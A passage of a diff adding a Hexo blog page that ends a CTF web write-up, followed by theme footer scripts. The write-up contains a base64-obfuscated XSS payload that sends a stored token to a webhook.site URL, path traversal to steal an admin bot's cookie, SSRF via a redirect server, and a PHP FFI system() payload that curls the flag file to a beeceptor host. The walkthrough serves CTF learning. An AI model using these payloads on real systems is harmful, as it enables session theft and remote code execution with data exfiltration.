+  <span class="hljs-attr">&quot;createdAt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2025-10-14T13:29:07.096Z&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;updatedAt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2025-10-14T13:50:04.523Z&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;profilePhotoUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;s&#x27; onerror=eval(atob(&#x27;ZmV0Y2goYGh0dHBzOi8vd2ViaG9vay5zaXRlL2Q0Mzg3ZTU4LTU0MWEtNDNiMy1iODJjLTliMGQxZjNmOWIxNi8/Y29rPSR7bG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyl9YCk7&#x27;)) x=&#x27;&quot;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+<p>Make an upload image request, base64 all the full payload and add it in the <code>profilePhoto</code> parameter</p>
+<p><img src="/images/0/Screenshot%202025-10-15%20112445.png" srcset="/img/loading.gif" lazyload></p>
+<p>Grab that <code>profilePhotoUrl</code> and let’s request it to see our payload</p>
+<p><img src="/images/0/Screenshot%202025-10-15%20112502.png" srcset="/img/loading.gif" lazyload></p>
+<p>Cool! The payload is good. Now send it to the bot with path traversal sequence <code>../../uploads/mgqlm0ig8w0he7c95gi.jpg</code> (base64 encode it first)</p>
+<p><img src="/images/0/Screenshot%202025-10-14%20220558.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/0/Screenshot%202025-10-15%20112532.png" srcset="/img/loading.gif" lazyload alt="admin cookie"></p>
+<h2 id="SSRF-RCE"><a href="#SSRF-RCE" class="headerlink" title="SSRF&amp;RCE"></a>SSRF&amp;RCE</h2><p>After getting the admin cookie you can access the <code>/api/admin/fetch-url</code> to access the php service. What you need is to publish a server that will redirect any request to <code>http://php</code>.</p>
+<p>You can create a python server with ngrok but i used <a target="_blank" rel="noopener" href="https://app.beeceptor.com/">beeceptor</a> instead. That’s how to do the SSRF part.</p>
+<p>The RCE part is kinda tricky, all the basic command injection payloads will not really work cause the service probably disabled all the sensitive functions or it has a WAF on it. But if you looked at the dockerfile of the service again:</p>
+<div class="code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> php:<span class="hljs-number">8.2</span>-apache
+<span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y libffi-dev</span>
+<span class="hljs-keyword">RUN</span><span class="language-bash"> docker-php-ext-install ffi</span>
+<span class="hljs-keyword">COPY</span><span class="language-bash"> php.ini /usr/local/etc/php/php.ini</span>
+<span class="hljs-keyword">COPY</span><span class="language-bash"> flag.txt /flag.txt</span>
+<span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /flag.txt /flag_$(<span class="hljs-built_in">head</span> /dev/urandom | <span class="hljs-built_in">tr</span> -dc a-z0-9 | <span class="hljs-built_in">head</span> -c 16).txt</span>
+<span class="hljs-keyword">COPY</span><span class="language-bash"> index.php /var/www/html/</span>
+<span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span></code></pre></div>
+<p>You will notice it’s installing <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.ffi.php">ffi</a>. <code>ffi</code> is like a mechanism that allows a program written in one programming language to call functions and use services written in another language, typically a lower-level one like C.</p>
+<p>In this case we can call sensitive functions, bypassing the striction exist in the php service successfully. I spent some time is this part until i made the final payload:<br><code>$ffi=FFI::cdef(&#39;int system(const char* command);&#39;); $ffi-&gt;system(&#39;curl https://macabely.free.beeceptor.com -T /flag*&#39;);</code></p>
+<p>Here we called the system function and used the curl command from it.</p>
+<p>By this information, you can start a server and make it redirect to: <code>Location: http://php?code=$ffi=FFI::cdef(&#39;int system(const char* command);&#39;); $ffi-&gt;system(&#39;curl https://macabely.free.beeceptor.com -T /flag*&#39;);</code></p>
+<p><img src="/images/0/Screenshot%202025-10-15%20123508.png" srcset="/img/loading.gif" lazyload alt="Make the server"></p>
+<p><img src="/images/0/Screenshot%202025-10-15%20123615.png" srcset="/img/loading.gif" lazyload alt="Send the request"></p>
+<p><img src="/images/0/Screenshot%202025-10-15%20121212.png" srcset="/img/loading.gif" lazyload alt="Get the flag"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/08/ctfs/securinetsctf/" title="SecurinetsCTF 2025">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SecurinetsCTF 2025</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/28/ctfs/olympicsctf/" title="OlympicsCTF 2025">
+                        <span class="hidden-mobile">OlympicsCTF 2025</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
